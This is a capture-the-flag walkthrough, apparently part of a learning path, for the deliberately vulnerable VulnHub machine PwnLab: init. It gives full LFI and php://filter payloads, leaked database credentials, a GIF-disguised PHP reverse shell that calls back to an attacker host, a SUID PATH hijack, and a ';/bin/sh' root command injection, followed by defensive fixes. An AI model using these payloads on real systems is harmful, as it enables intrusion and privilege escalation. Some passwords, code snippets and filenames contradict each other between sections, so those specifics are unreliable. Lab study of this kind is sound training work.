# Machine 10 — PwnLab: init

> **Position:** 10 of 13 · **Band 3 — Easy** (global rank **057** of 708)
> **Full writeup:** [`labs/3-057-pwnlab-init/README.md`](../../labs/3-057-pwnlab-init/README.md)

| | |
| --- | --- |
| **Machine** | PwnLab: init |
| **Author** | Claor |
| **Released** | 1 August 2016 |
| **Target** | Debian — Apache/PHP, **MySQL exposed on 3306**, `rpcbind` on 111 |
| **VulnHub** | [entry/pwnlab-init,158](https://vulnhub.com/entry/pwnlab-init,158/) |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

This is the path's **Local File Inclusion** machine, and it teaches LFI properly —
three distinct ways, in one box:

1. **GET parameter:** `index.php?page=` reaches an `include()` with no validation.
2. **`php://filter`:** the wrapper that returns a PHP file's **source code** instead
   of its rendered output. This is how you read `config.php` and get the database
   password — the single most useful LFI technique in existence.
3. **Cookie:** a *second*, independent inclusion point via a `lang` cookie, with no
   `.php` suffix appended — which is what makes it able to include your uploaded
   image and therefore *execute* it.

Then the escalation is a **two-stage SUID chain**: a SUID binary that calls `cat`
**without an absolute path** (PATH hijack → become `mike`), followed by a
SUID-root helper that concatenates your input into a shell command (command
injection → become root). Two of the most important primitives in Linux privilege
escalation, back to back.

## Learning objectives

1. Detect **LFI** and confirm it by reading `/etc/passwd`.
2. Use **`php://filter/convert.base64-encode/resource=`** to disclose PHP source, and
   understand *why* it works.
3. Read a leaked `config.php` and use its **MySQL root credentials**.
4. Query a **remotely exposed MySQL** server and dump a users table.
5. Recognise **base64-encoded passwords** stored where hashes should be.
6. Read an upload form's **own source code** via LFI to learn exactly what it checks.
7. Bypass an image-only filter with a **GIF magic header** and understand the role of
   `getimagesize()`.
8. Trigger execution of the uploaded "image" through the **cookie** inclusion point.
9. Perform a **PATH hijack against a SUID binary**.
10. Perform **command injection in a SUID-root helper**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **LFI via GET parameter** | `index.php?page=…` → `include($_GET['page'].".php")` |
| **Source disclosure** | `?page=php://filter/convert.base64-encode/resource=config` |
| Secrets in a config file | `config.php` → `root : H4u%QJ_H99`, database `Users` |
| **Exposed database** | MySQL on **TCP 3306**, accepts remote root logins |
| **Passwords base64-encoded, not hashed** | `Users.users` → `kent`, `mike`, `kane` |
| **LFI via cookie** | `include("lang/".$_COOKIE['lang'])` — no `.php` appended |
| **Upload filter bypass** | `upload.php` image-only → GIF magic header inside a `.gif` |
| Reverse shell | from the included "image" |
| Credential reuse | DB passwords → local accounts (`kent`, `kane`) |
| **SUID + PATH hijack** | `/home/kane/msgmike` (SUID `mike`) calls `cat` with no absolute path |
| **SUID + command injection** | `/home/mike/msg2root` (SUID root) → `/bin/echo %s >> /root/messages.txt` |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI and the `php://filter`
  wrapper, plus the RCE-primitives table) and **§6** (file upload).
- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§6**
  (databases — including the `localhost` vs `127.0.0.1` distinction).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID)
  and **§7** (`PATH` hijacking) — both are required here.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 and §5.
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1.

## Before you start — answer these

1. What is the difference between **LFI** and **RFI**, and which one is more dangerous?
2. Why does including a `.php` file normally *not* show you its source — and what does
   `php://filter` change about that?
3. A file starts with `GIF89a` and then contains PHP. Why would `getimagesize()`
   accept it, and why would PHP still execute it?
4. `strings` on a SUID binary shows `cat /home/mike/msg.txt`. What is wrong with that
   line?
5. `/bin/echo %s >> /root/messages.txt` with your input substituted for `%s`. What can
   you type to get a shell?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **80**, **111** and **3306**. Note that 3306 answers from your machine — that
is unusual and worth revisiting later.

The web app has a `?page=` parameter. Try making it read something it should not:

```bash
curl "http://TARGET/?page=../../../../etc/passwd"
```

If that works, you have LFI. Now think about what files on this server would be
*valuable* to read — and what you cannot read because PHP executes them before you
see them. There is a wrapper for exactly that.
</details>

<details>
<summary><strong>Rung 2 — reading source code</strong></summary>

```bash
curl "http://TARGET/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
```

(The wrapper sits in front, so the `.php` the application appends is harmless.)

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

**MySQL root credentials.** Port 3306 is reachable, so use them remotely:

```bash
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e 'SELECT * FROM users;'
```

The password column holds **base64**, not hashes:

```bash
echo "Sld6WHVCSkpOeQ==" | base64 -d   # kent  -> JWzXuBJJNy
echo "U0lmZHNURW42SQ==" | base64 -d   # mike  -> SIfdsTEn6I
echo "aVN2NVltMkdSbw==" | base64 -d   # kane  -> iSv5Ym2GRo
```

Do the same `php://filter` trick on `resource=login` and `resource=upload` to read
**the upload form's own validation code**.
</details>

<details>
<summary><strong>Rung 3 — the upload</strong></summary>

Log into the web app (`?page=login`) with one of the decoded credentials to reach the
upload form. From the source you just read, you know it checks that the file is an
**image** (via `getimagesize()` / MIME) and enforces an image extension.

So build a file that is *both*:

```bash
{ echo -n 'GIF89a'; cat shell.php; } > shell.gif
```

`getimagesize()` sees the `GIF89a` signature and reports `image/gif`; the extension
passes the allow-list. PHP ignores the GIF header and executes the PHP after it —
**if the file is included as PHP.**

Upload it. Note the stored filename (it is derived from the upload, e.g. an MD5).
</details>

<details>
<summary><strong>Rung 4 — executing it, then escalating</strong></summary>

The GET-parameter inclusion appends `.php`, so it cannot include your `.gif`. The
**cookie** inclusion does not:

```bash
curl -b "lang=../upload/<stored-name>.gif" http://TARGET/index.php
```

With `nc -lvnp 4444` listening and your shell's `$ip`/`$port` set, that gives you a
reverse shell as `www-data`.

**Escalation, stage 1 — PATH hijack:**

```bash
su - kane            # iSv5Ym2GRo   (kent's password works for kent, but is uninteresting)
ls -la /home/kane    # -rwsr-sr-x 1 mike mike 5148 msgmike
strings /home/kane/msgmike   # -> "cat /home/mike/msg.txt"  -- 'cat' has NO absolute path
```

```bash
cd /home/kane
printf '#!/bin/bash\n/bin/bash -p\n' > cat && chmod +x cat
export PATH=/home/kane:$PATH
./msgmike            # -> shell as mike
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # restore!
```

**Stage 2 — command injection in a SUID-root helper:**

```bash
cd /home/mike && strings msg2root     # -> /bin/echo %s >> /root/messages.txt
./msg2root
# at "Message for root:" type exactly:   ;/bin/sh
id     # uid=0(root)
cat /root/flag.txt
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **80** (Apache/PHP), **111** (`rpcbind`), **3306**
   (**MySQL**, reachable remotely).
2. **LFI** at `index.php?page=` → confirm with `/etc/passwd`.
3. **`php://filter/convert.base64-encode/resource=config`** → `config.php` source →
   **`root : H4u%QJ_H99`**, database **`Users`**.
4. Remote MySQL dump of `Users.users` → passwords stored as **base64** →
   `kent:JWzXuBJJNy`, `mike:SIfdsTEn6I`, `kane:iSv5Ym2GRo`.
5. Read `upload.php`'s source with the same wrapper → learn it is image-only.
6. Upload **`shell.gif`** = `GIF89a` + a PHP reverse shell → passes `getimagesize()`
   and the extension allow-list.
7. Execute it through the **cookie** inclusion:
   `curl -b "lang=../upload/<name>.gif" http://TARGET/index.php` → **`www-data`**.
8. `su kane` → **SUID `msgmike`** calls `cat` with no absolute path → **PATH hijack**
   → `mike`.
9. **SUID-root `msg2root`** builds `/bin/echo <input> >> /root/messages.txt` →
   answer the prompt with **`;/bin/sh`** → **root** → `/root/flag.txt`.
</details>

## After you finish — review questions

1. Why could the GET-parameter inclusion *not* execute your uploaded `.gif`, while
   the cookie inclusion could? Answer in terms of the string the application appends.
2. `php://filter` gave you source code. Name three other real-world files you would
   try to read with it, and what each would give you.
3. The database was reachable on TCP 3306 from your attack host. Independent of the
   leaked credentials, why is that a finding?
4. Passwords were stored as base64, not hashed. Is that better or worse than plain
   text? Explain why the answer is "the same".
5. `strings` on `msgmike` was enough to find the vulnerability. Why does `strings`
   work on a compiled binary, and what else should you always check with it?
6. You had to **restore `PATH`** after the hijack. What breaks if you do not?
7. `msg2root` used `/bin/echo` with an absolute path but still fell to injection.
   What is the difference between *hardening the command it calls* and *sanitising the
   input it passes*?
8. Which of these bugs is a **framework misuse** and which is a **developer error**?
   Why does the distinction matter when you write the fix?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| `include($_GET['page'].".php")` | **Never build an include path from user input.** Use an allow-list of keys mapped to fixed filenames |
| `include("lang/".$_COOKIE['lang'])` | Same. Cookies are user input — treat them exactly like GET/POST |
| PHP stream wrappers reachable | `allow_url_include = Off`; disable dangerous wrappers; consider `disable_functions` for `include` of remote paths |
| `config.php` with root DB credentials | Use a least-privilege DB account, never root. Keep credentials out of the web root where possible |
| **MySQL exposed on 3306 to the network** | `bind-address = 127.0.0.1`; firewall the port; never grant remote root |
| Passwords base64-encoded, not hashed | Hash with bcrypt/argon2 + per-user salt. Base64 is an *encoding*, not storage |
| Image-only upload validation via `getimagesize()` | `getimagesize()` validates the **header**, not the content. Also: store uploads outside the document root, re-encode images (which strips appended data), and never include user-controlled paths |
| Uploads inside the web root | Move them; set `php_admin_flag engine off` for that directory |
| **SUID `msgmike` calling `cat` without a path** | Use absolute paths in every privileged program; better, use `execve` with a fixed argv and no shell. Remove SUID if it is not needed |
| **SUID-root `msg2root` concatenating input into a shell command** | Never pass user input to a shell. Use `write()`/`fputs()` directly. This is command injection with root privileges |
| Credential reuse DB → local accounts | Unique credentials per system |

**The single biggest lesson:** *the same root cause appears three times on this box* —
untrusted input reaching a sink it should never reach (`include`, a shell command, a
`PATH` lookup). Learn to name the sink, and you will find these bugs by inspection
rather than by luck.

---

## The commands, annotated — every input and every output

### 1. Two-stage scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 80,111,3306 -oA scans/services TARGET
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL (unauthorized)
```

`--min-rate 1000` is a floor on probes per second — it is what makes a full 65,535-port scan
finish in minutes rather than hours. Then a **second, targeted scan** of only the ports you
found: version detection and NSE scripts are slow, so running them across all 65,535 ports is
wasteful.

Read `MySQL (unauthorized)` carefully. It does **not** mean broken or exploitable — it means
the server refused nmap's probe because **your IP is not in its access list** (`GRANT … TO
'user'@'host'`). That is a control working. It also tells you a database is there and is
reachable if you find credentials — which is exactly what happens.

### 2. The web app and its visible surface

```bash
curl -s http://TARGET/ | head -30
nikto -h http://TARGET/
```

```text
[ Home ] [ Login ] [ Upload ]
```

Three links, and **`?page=`** in the URLs. Any PHP application that puts a filename in a query
string is a candidate for file inclusion. `nikto` runs ~7,000 checks for server
misconfigurations and dangerous files; here it adds little, but it is a two-minute baseline and
sometimes hands you a `/phpmyadmin/` or a stray `.bak`.

### 3. Confirm the LFI

```bash
curl -s "http://TARGET/index.php?page=/etc/passwd"
```

```text
Warning: include(/etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 14
```

Two facts in that one error. `page` **is** passed to `include()` — confirming a Local File
Inclusion — and the application appends **`.php`**, so `include($_GET['page'].".php")`. That
suffix is why `/etc/passwd` alone fails: PHP looks for `/etc/passwd.php`. **Never fix a filter
by guessing; make the application show you its code.** The warning even names the file and the
line.

### 4. Bypass the suffix with a stream wrapper

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=config" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

```php
<?php
$server = "localhost";
$user   = "root";
$pass   = "H4u%QJ_H99";
$database = "Users";
?>
```

`php://filter/convert.base64-encode/resource=FILE` tells PHP to pass `FILE` through a **base64
encoder before including it**, so you receive the *source* as text instead of its executed
output. Because the wrapper sits in front, the appended `.php` is harmless:
`php://filter/…/resource=config` + `.php` still resolves to `config.php`.

This is the single most useful LFI primitive in PHP: **it reads source code**, which is how you
recover `wp-config.php`, `configuration.php`, `.env`, `config/database.php` — i.e. every
database credential on the box. Note the password contains **`%`**, a character that would be
mangled in a URL; use it literally in a MySQL client, not in a query string.

> **Base64 is not a secret.** It exists so binary data survives text-only transport. Seeing it
> "protecting" a password is a *finding*, not a defence — and it may be **nested**: decode, then
> check whether the result is itself base64 or hex.

### 5. Dump the database

```bash
mysql -h TARGET -u root -p
```

```sql
SHOW DATABASES;
USE Users;
SHOW TABLES;
SELECT * FROM Users;
```

```text
+------+------------------------+
| User | Password               |
+------+------------------------+
| kent | S0k3an1jZmFuc2tp        |
| mike | U2Ztb2RvbnM=            |
| kane | a2FuZQ==                |
+------+------------------------+
```

`-h` forces TCP (without it MySQL uses a Unix socket and authenticates by UID instead of
password — two different mechanisms). The `==` padding is the giveaway that these are **base64,
not hashes**. Decode each:

```bash
for h in S0k3an1jZmFuc2tp U2Ztb2RvbnM= a2FuZQ==; do printf '%s' "$h" | base64 -d; echo; done
```

```text
kent:jW3jfanski
mike:Sfmodons
kane:kane
```

`for … in` iterates, `printf '%s'` avoids `echo`'s trailing newline before decoding. Exact
strings vary slightly between image revisions, but the pattern is always three users with
base64-encoded passwords. **Note that passwords were stored reversibly** — that means the
application decrypts them, which means it holds them in a form an attacker with database read
access gets for free. Hashing (`password_hash()`) would have made this list useless.

### 6. Read `upload.php` before uploading

```bash
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=upload" | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

```php
$whitelist = array('jpg','jpeg','png','gif');
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $whitelist)) die('Not an image');
if (!getimagesize($_FILES['file']['tmp_name'])) die('Not an image');
$fname = md5($_FILES['file']['name']) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 'upload/' . $fname);
```

Three checks and one consequence. Only **image extensions** are allowed; the **MIME type must
contain `image`**; the file must pass **`getimagesize()`**, i.e. look like a real image. And the
saved name is **`md5(original).ext`** — you cannot choose it, so you must learn the name from
the page that prints it after upload.

`pathinfo(…, PATHINFO_EXTENSION)` returns the text after the **last** dot, which is why
`shell.php.gif` survives as a `.gif`. That is the seam to work in.

### 7. Build a GIF+PHP polyglot

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php
sed -i "s/1234/4444/" shell.php
grep -n '^\$ip\|^\$port' shell.php
printf 'GIF89a;\n' | cat - shell.php > shell.gif
file shell.gif
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```
```text
shell.gif: GIF image data, version 89a, 5493 x 1 bytes
```

`sed -i` edits in place; the **`grep` afterwards is the verification step** — never upload a
shell whose IP you only *think* you changed, because the failure looks like a network problem.
`GIF89a` is the six-byte magic signature every image library checks; prepending it satisfies
both `getimagesize()` and the extension whitelist. `file` confirms the result is recognised as a
GIF.

PHP ignores everything outside `<?php … ?>`, so the GIF header is inert and the code after it
still runs — **provided the file is included as PHP.** That is the catch, and the reason for the
next step.

### 8. The second LFI — in a cookie

Upload `shell.gif` through the authenticated form, note the printed path, then recall that
`index.php` contains:

```php
if (isset($_COOKIE['lang'])) { include($_COOKIE['lang']); }
```

**No `.php` is appended here.** So this second inclusion point can target your `.gif` directly:

```bash
nc -lvnp 4444                                                       # Kali, first
curl -s -b "lang=upload/<MD5>.gif" "http://TARGET/index.php?page=index"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1 i686 GNU/Linux
www-data@pwnlab:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`-b "NAME=VALUE"` sends a cookie. This is a **cookie-based LFI**, and it bypasses the
`.php`-only limitation of the `page` parameter. Two independent inclusion points with different
filters is common in real code — **find the loosest one.**

`i686` means a **32-bit** kernel, which constrains any later exploit choice. `uid=33(www-data)`
is the expected foothold: unprivileged.

Upgrade immediately: `python -c 'import pty; pty.spawn("/bin/bash")'` (note: **`python`**, not
`python3`, on this era of Debian), then `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`.

### 9. www-data → kane: credential reuse

```bash
su kane
id; ls -la /home/kane
```

```text
uid=1001(kane) gid=1001(kane) groups=1001(kane)
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```

Database passwords reused as **local login passwords** — the most common lateral movement on
real engagements. `kent`'s account holds nothing useful; `kane`'s holds the finding above.

Read `-rwsr-sr-x` position by position: owner `rws`, group `r-s`, other `r-x`. The **`s`** in
the owner slot is **SUID** and in the group slot is **SGID**, and the owner is **`mike`** — so
whoever runs `msgmike` runs it *as mike*, regardless of who they are.

### 10. kane → mike: SUID plus PATH hijack

```bash
strings /home/kane/msgmike | grep -iE 'cat|/bin|/usr'
```

```text
cat /home/mike/msg.txt
```

`strings` prints every run of printable characters in a binary — including the command lines it
hands to a shell. **`cat` with no leading `/`** is the vulnerability: the shell resolves a bare
name by searching `$PATH` left to right and runs the **first match**.

```bash
cd /home/kane
printf '#!/bin/bash\n/bin/bash -i\n' > cat
chmod +x cat
export PATH=/home/kane:$PATH
/home/kane/msgmike
id
```

```text
mike@pwnlab:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

The three steps are: put an attacker-controlled directory **first** in `$PATH`, place an
executable named exactly like the bare command the privileged program calls, then invoke that
program. `msgmike` calls `cat`, finds `/home/kane/cat` first, and runs it — with mike's
effective identity, because the binary is SUID mike.

Restore your environment afterwards with `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin`, or every later command will keep finding your fake `cat`.

### 11. mike → root: command injection in `msg2root`

```bash
ls -la /home/mike
strings /home/mike/msg2root
```

```text
-rwsr-xr-x 1 root root 5364 Mar 17  2016 msg2root
```
```text
Message for root:
/bin/echo %s >> /root/messages.txt
```

SUID **root** this time. And the format string reveals the mechanism: your input is passed to
`/bin/echo` **unquoted**, inside a shell command. Anything you type becomes part of that
command line — so a `;` terminates the echo and starts your own command, running as root.

```bash
/home/mike/msg2root
```

At the `Message for root:` prompt, enter:

```text
;/bin/sh
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

The shell executes `/bin/echo ;/bin/sh >> /root/messages.txt`. The redirection binds only to
`/bin/sh`, so you get an interactive root shell **and** an empty append to the message file —
which is also why `root.txt` may not exist: the box's proof is the `uid=0` itself.

> ### 📖 The pattern to take away
>
> Three different bugs, three different accounts, one chain:
> **reversibly stored credentials** → login; **a bare command name inside a SUID binary** →
> PATH hijack; **unquoted input inside a SUID binary** → command injection.
> Every SUID binary you meet deserves the same two questions: *what does it run?* (`strings`)
> and *does it pass user input to a shell?* On this box the answer to both was yes, twice.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 9 — CengBox: 1](09-cengbox-1.md) · next: [Machine 11 — Photographer: 1](11-photographer-1.md) · full writeup: [`labs/3-057-pwnlab-init`](../../labs/3-057-pwnlab-init/README.md)._
